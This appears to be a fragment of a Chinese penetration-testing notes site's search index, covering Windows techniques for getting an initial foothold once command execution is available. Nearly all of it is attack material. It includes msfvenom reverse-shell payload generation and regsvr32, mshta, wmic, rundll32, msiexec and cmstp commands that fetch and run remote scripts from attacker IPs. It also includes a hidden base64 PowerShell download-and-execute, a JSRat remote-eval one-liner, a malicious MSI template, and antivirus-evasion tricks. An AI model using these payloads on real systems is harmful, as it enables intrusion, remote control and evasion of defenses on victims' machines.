<windows.h> #include <tchar.h> int main() { TCHAR *dllpath = _T(\"c:\\\\windows\\\\system32\\\\scrobj.dll\"); HMODULE hDllScr = LoadLibrary(dllpath); if (hDllScr == NULL) { puts(\"Load scrobj.dll fail!\"); } puts(\"Load scrobj.dll success!\"); printf(\"Address: %p\\n\", hDllScr); void* DllInstallProcAddr = (void*)GetProcAddress(hDllScr, \"DllInstall\"); if (DllInstallProcAddr == NULL) { puts(\"Can not found DllInstall in scrobj.dll!\"); } printf(\"Found Dllinstall(%p) in scrobj.dll!\", DllInstallProcAddr); ((void (*)(BOOL, TCHAR*))DllInstallProcAddr)(FALSE, L\"http://127.0.0.1/ttt.txt\"); return 0; } \u8fdc\u7a0b\u8c03\u7528\u7684\u6587\u4ef6 <?XML version=\"1.0\"?> <component id=\"TESTING\"> <registration progid=\"TESTING\" classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" > <script language=\"JScript\"> <![CDATA[ var wsc = \"WScript.Shell\"; var com = \"calc.exe\"; var foo = new ActiveXObject(wsc).Run(com); ]]> </script> </registration> </component> rundll32\u65b9\u5f0f metaspolit\u6a21\u5757 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f dll > 1.dll use exploit/windows/smb/smb_delivery rundll32.exe \\\\192.168.1.107\\ZtmW\\test.dll,0 \u914d\u5408Koadic use stager/js/rundll32_js set SRVHOST 192.168.1.107 run SCT\u6587\u4ef6\u76f4\u63a5\u5229\u7528 pubprn.vbs\u7ed3\u5408SCT\u6587\u4ef6\u5229\u7528 windows7\u4e0b\u672a\u6210\u529f cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:http://10.100.18.20:8000/1.sct \u914d\u5408empire listeners uselistener http set Host 192.168.1.109 execute usestager windows/launcher_sct set Listener HTTP execute WMIC\u5229\u7528xsl\u65b9\u5f0f \u914d\u5408koadic https://github.com/zerosum0x0/koadic use stager/js/wmic set SRVHOST 192.168.1.107 run wmic os get /FORMAT:\"http://192.168.1.109/payload.xsl\" \u81ea\u5b9a\u4e49xsl <?xml version='1.0'?> <stylesheet xmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"placeholder\" version=\"1.0\"> <output method=\"text\"/> <ms:script implements-prefix=\"user\" language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc\"); ]]> </ms:script> </stylesheet> \u672c\u5730\u6267\u884c \u4e00\u822c\u800c\u8a00\uff0c\u672c\u5730\u6267\u884c\u7684BypassAV\u7684\u80fd\u529b\u90fd\u6bd4\u8fdc\u7a0b\u5f3a\uff0c\u7f3a\u70b9\u5c31\u662f\u6587\u4ef6\u843d\u5730\u96be\u3002 MSbuild.exe\u5229\u7528 msfvenom -p windows/meterpreter/reverse_tcp lhost=45.76.107.177 lport=6677 -f csharp C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe exp.csproj \uff08\u6539\u4e3aXML\u683c\u5f0f\u4e5f\u53ef\uff09 INF\u6587\u4ef6\u5229\u7528 \u914d\u5408cmstp.exe \u4f9d\u9760\u52a0\u8f7d\u8fdc\u7a0bsct\u6587\u4ef6\u5229\u7528 \u65b0\u5efa\u4e00\u4e2ainf\uff0c\u5728\u4ee3\u7801\u5904\u586b\u5165\u6076\u610fsct\u6587\u4ef6\u3002 \u7136\u540e\u8fd0\u884ccmstp.exe /s shell.inf [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] UnRegisterOCXs=UnRegisterOCXSection [UnRegisterOCXSection] %11%\\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct [Strings] AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\" ServiceName=\"Yay\" ShortSvcName=\"Yay\" \u914d\u5408InfDefaultInstall.exe \u8fd0\u884cInfDefaultInstall.exe shady.inf \u4ee5\u4e0a","title":"\u5728\u547d\u4ee4\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u4e0a\u7ebf\u7684\u51e0\u79cd\u65b9\u5f0f Windows"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#title-windows-date-2021-01-13-084937","text":"","title":"title: \u5728\u547d\u4ee4\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u4e0a\u7ebf\u7684\u51e0\u79cd\u65b9\u5f0f-Windows date: 2021-01-13 08:49:37"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#_1","text":"","title":"\u8fdc\u7a0b\u6267\u884c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#powershell","text":"","title":"Powershell"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#base64","text":"\u4e0b\u8f7d\u5e76base64 $fileContent = \"(new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'\" $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent); $encoded = [System.Convert]::ToBase64String($bytes); $encoded \u6267\u884c powershell -WindowStyle Hidden -enc base64","title":"\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c+base64"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#mshta","text":"\u6267\u884cvb >mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"calc.exe\",0,true)(window.close) Js >mshta javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im mshta.exe\",0,true);} Jsrat >mshta javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.2.101:9998/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im mshta.exe\",0,true);}","title":"mshta\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#metaspolit","text":"use exploit/windows/misc/hta_server mshta xxx \u6267\u884cmshta xxxxx","title":"metaspolit\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#cactustorch","text":"\u4e0b\u8f7d https://github.com/mdsecactivebreach/CACTUSTORCH \u751f\u6210raw\u683c\u5f0f\u7684shellcode\u5e76base64 base64\u4ece\u6587\u4ef6\u5feb\u901f\u7f16\u7801\u547d\u4ee4\uff1acat 1.bin |base64 -w 0 \u4fee\u6539CACTUSTORCH.hta\u6587\u4ef6\u4e2dDim code\u5904\u7684\u5185\u5bb9\u4e3abase64\u540e\u7684shellcode \u6267\u884cmshta http://x.x.x.x/CACTUSTORCH.hta","title":"\u914d\u5408CACTUSTORCH"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#greatsct","text":"use Bypass use mshta/shellcode_inject/base64_migrate","title":"\u914d\u5408GreatSCT"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#msiexec","text":"\u53ef\u4ee5\u5c06msi\u540e\u7f00\u6539\u4e3apng","title":"msiexec\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#metaspolit_1","text":"msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 \u2013f msi > shell.msi msiexec /q /i http://x.x.x.x/shell.msi","title":"metaspolit\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#msi","text":"\u4fee\u6539\u6076\u610fmsi.wix\u6587\u4ef6\u4e2d\u8981\u6267\u884c\u7684\u547d\u4ee4 <?xml version=\"1.0\"?> <Wix xmlns=\"http://schemas.microsoft.com/wix/2006/wi\"> <Product Id=\"*\" UpgradeCode=\"12345678-1234-1234-1234-111111111111\" Name=\"Example Product Name\" Version=\"0.0.1\" Manufacturer=\"@_xpn_\" Language=\"1033\"> <Package InstallerVersion=\"200\" Compressed=\"yes\" Comments=\"Windows Installer Package\"/> <Media Id=\"1\" /> <Directory Id=\"TARGETDIR\" Name=\"SourceDir\"> <Directory Id=\"ProgramFilesFolder\"> <Directory Id=\"INSTALLLOCATION\" Name=\"Example\"> <Component Id=\"ApplicationFiles\" Guid=\"12345678-1234-1234-1234-222222222222\"> </Component> </Directory> </Directory> </Directory> <Feature Id=\"DefaultFeature\" Level=\"1\"> <ComponentRef Id=\"ApplicationFiles\"/> </Feature> <Property Id=\"cmdline\">calc </Property> <CustomAction Id=\"SystemShell\" Execute=\"deferred\" Directory=\"TARGETDIR\" ExeCommand='[cmdline]' Return=\"ignore\" Impersonate=\"no\"/> <CustomAction Id=\"FailInstall\" Execute=\"deferred\" Script=\"vbscript\" Return=\"check\"> invalid vbs to fail install </CustomAction> <InstallExecuteSequence> <Custom Action=\"SystemShell\" After=\"InstallInitialize\"></Custom> <Custom Action=\"FailInstall\" Before=\"InstallFiles\"></Custom> </InstallExecuteSequence> </Product> </Wix> \u4f7f\u7528wix\u5de5\u5177\u7f16\u8bd1\u751f\u6210msi candle.exe msi.wix light.exe xxx.wixobj","title":"\u81ea\u7f16\u8bd1msi"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#exemsi","text":"\u4f7f\u7528exe2msi.msi\u5de5\u5177\u5c06exe\u8f6c\u4e3amsi \u5982\u679cexe\u662f\u514d\u6740\u7684\uff0c\u90a3\u4e48\u8fd9\u6837\u4e00\u6765\u5c31\u53ef\u4ee5\u65e0\u9700exe\u843d\u5730\u5c31\u80fd\u8fdc\u7a0b\u6267\u884c","title":"exe\u8f6cmsi"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#regsvr32","text":"","title":"regsvr32\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#metaspolit_2","text":"use exploit/multi/script/web_delivery regsvr32 /s /n /u /i:http://x.x.x.x/file.sct scrobj.dll","title":"\u914d\u5408metaspolit\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#empire","text":"uselistner http #\u5f00\u542f\u76d1\u542c set Host http://192.168.1.109 #\u8bbe\u7f6e\u76d1\u542c\u5730\u5740 execute #\u8fd0\u884c\u76d1\u542c usestager windows/launcher_sct #\u9009\u62e9\u6a21\u5757 set listener http #\u9009\u62e9\u76d1\u542c execute #\u8fd0\u884c\u6a21\u5757 regsvr /s /n /u /i:http://192.168.1.109:8080/tmp/launcher.sct scrobj.dll","title":"\u914d\u5408empire"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#sct","text":"<?XML version=\"1.0\"?> <scriptlet> <registration progid=\"PoC\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\" > <!-- Proof Of Concept - Casey Smith @subTee --> <!-- License: BSD3-Clause --> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </registration> </scriptlet> \u6267\u884c\uff1aregsvr32 /u /n /s /i:http://192.168.1.109/1.sct scrobj.dll","title":"\u81ea\u5b9a\u4e49SCT\u6587\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#koadic","text":"use stager/js/regsvr set srvhost 192.168.1.107 run regsvr32 /u /n /s /i:http;//192.168.1.107:9998/uWBjv scrobj.dll zombies 0","title":"\u914d\u5408koadic"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#jsrat","text":"\u4e0b\u8f7dhttps://github.com/Hood3dRob1n/JSRat-Py \u5728\u672c\u673a\u6267\u884c./JSRat.py -I 0.0.0.0 -p 9999\u540e\uff0c\u811a\u672c\u4f1a\u81ea\u52a8\u751f\u6210\u547d\u4ee4 JSRat Server - Python Implementation By: Hood3dRob1n [*] Web Server Started on Port: 9999 [*] Awaiting Client Connection to: [*] rundll32 invocation: http://0.0.0.0:9999/connect [*] regsvr32 invocation: http://0.0.0.0:9999/file.sct [*] Client Command at: http://0.0.0.0:9999/wtf [*] Browser Hook Set at: http://0.0.0.0:9999/hook [-] Hit CTRL+C to Stop the Server at any time...","title":"\u914d\u5408JSRat"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#greatsct_1","text":"use Bypass use regsvr/shellcode_iject/base64_migrate.py generate","title":"\u914d\u5408GreatSCT"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#bypass","text":"","title":"Bypass\u7684\u4e00\u4e9b\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#eybfaq","text":"copy c:\\windows\\system32\\regsvr32.exe aa.eyb copy c:\\windows\\system32\\scrobj.dll aa.faq aa.eyb /s /i:http://127.0.0.1:8000/1.sct aa.faq","title":"eyb\u548cfaq\u540e\u7f00\u7ed5\u8fc7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#_2","text":"\u5b57\u7b26\u5e72\u6270 regsvr32 /u /n /s /i:h^t^t^p://192.168.122.1/2021.sct scrobj.dll regsvr32 /u /n /s /i:h\"t\"t\"p://192.168.122.1/2021.sct scrobj.dll \u6587\u4ef6\u590d\u5236 \u53ef\u4ee5\u590d\u5236\u4e24\u4e2a\u4e00\u8d77\u7528 copy c:\\windows\\system32\\regsvr32.exe C:\\Users\\Administrator\\Desktop\\alc.ac regs.exe /u /n /s /i:http://192.168.122.1/2021.sct scrobj.dll copy c:\\windows\\system32\\scrobj.dll newscrobj.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct newscrobj.dll \u7b26\u53f7\u94fe\u63a5\uff0c\u9700\u8981\u94fe\u63a5\u7684dll\u76ee\u5f55\u4e0b\u8fdb\u884c Mklink.exe c:\\programdata\\Myscrobj.dll c:\\windows\\\\scrobj.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct Myscrobj.dll \u6570\u636e\u6d41\uff08ADS\uff09 type c:\\windows\\system32\\scrobj.dll > test.txt:new1.dll regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct test.txt:new1.dll \u672c\u5730\u8fd0\u884c bitsadmin /transfer download /download /priority normal http://192.168.122.1/2021.sct %TEMP%\\new2021.txt && regsvr32.exe /s /u /i:%TEMP%\\new2021.txt scrobj.dll","title":"\u4f7f\u7528\u547d\u4ee4\u7ed5\u8fc7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#_3","text":"#include <stdio.h> #include <stdlib.h> #include <windows.h> #include <tchar.h> int main() { TCHAR *dllpath = _T(\"c:\\\\windows\\\\system32\\\\scrobj.dll\"); HMODULE hDllScr = LoadLibrary(dllpath); if (hDllScr == NULL) { puts(\"Load scrobj.dll fail!\"); } puts(\"Load scrobj.dll success!\"); printf(\"Address: %p\\n\", hDllScr); void* DllInstallProcAddr = (void*)GetProcAddress(hDllScr, \"DllInstall\"); if (DllInstallProcAddr == NULL) { puts(\"Can not found DllInstall in scrobj.dll!\"); } printf(\"Found Dllinstall(%p) in scrobj.dll!\", DllInstallProcAddr); ((void (*)(BOOL, TCHAR*))DllInstallProcAddr)(FALSE, L\"http://127.0.0.1/ttt.txt\"); return 0; } \u8fdc\u7a0b\u8c03\u7528\u7684\u6587\u4ef6 <?XML version=\"1.0\"?> <component id=\"TESTING\"> <registration progid=\"TESTING\" classid=\"{A1112221-0000-0000-3000-000DA00DABFC}\" > <script language=\"JScript\"> <![CDATA[ var wsc = \"WScript.Shell\"; var com = \"calc.exe\"; var foo = new ActiveXObject(wsc).Run(com); ]]> </script> </registration> </component>","title":"\u8fdc\u7a0b\u8c03\u7528\u672c\u5730\u52a0\u8f7d"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#rundll32","text":"","title":"rundll32\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#metaspolit_3","text":"msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f dll > 1.dll use exploit/windows/smb/smb_delivery rundll32.exe \\\\192.168.1.107\\ZtmW\\test.dll,0","title":"metaspolit\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#koadic_1","text":"use stager/js/rundll32_js set SRVHOST 192.168.1.107 run","title":"\u914d\u5408Koadic"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#sct_1","text":"","title":"SCT\u6587\u4ef6\u76f4\u63a5\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#pubprnvbssct","text":"windows7\u4e0b\u672a\u6210\u529f cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:http://10.100.18.20:8000/1.sct","title":"pubprn.vbs\u7ed3\u5408SCT\u6587\u4ef6\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#empire_1","text":"listeners uselistener http set Host 192.168.1.109 execute usestager windows/launcher_sct set Listener HTTP execute","title":"\u914d\u5408empire"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#wmicxsl","text":"","title":"WMIC\u5229\u7528xsl\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#koadic_2","text":"https://github.com/zerosum0x0/koadic use stager/js/wmic set SRVHOST 192.168.1.107 run wmic os get /FORMAT:\"http://192.168.1.109/payload.xsl\"","title":"\u914d\u5408koadic"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#xsl","text":"<?xml version='1.0'?> <stylesheet xmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"placeholder\" version=\"1.0\"> <output method=\"text\"/> <ms:script implements-prefix=\"user\" language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc\"); ]]> </ms:script> </stylesheet>","title":"\u81ea\u5b9a\u4e49xsl"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#_4","text":"\u4e00\u822c\u800c\u8a00\uff0c\u672c\u5730\u6267\u884c\u7684BypassAV\u7684\u80fd\u529b\u90fd\u6bd4\u8fdc\u7a0b\u5f3a\uff0c\u7f3a\u70b9\u5c31\u662f\u6587\u4ef6\u843d\u5730\u96be\u3002","title":"\u672c\u5730\u6267\u884c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#msbuildexe","text":"msfvenom -p windows/meterpreter/reverse_tcp lhost=45.76.107.177 lport=6677 -f csharp C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe exp.csproj \uff08\u6539\u4e3aXML\u683c\u5f0f\u4e5f\u53ef\uff09","title":"MSbuild.exe\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#inf","text":"","title":"INF\u6587\u4ef6\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-Windows/#cmstpexe","text":"\u4f9d\u9760\u52a0\u8f7d\u8fdc\u7a0bsct\u6587\u4ef6\u5229\u7528 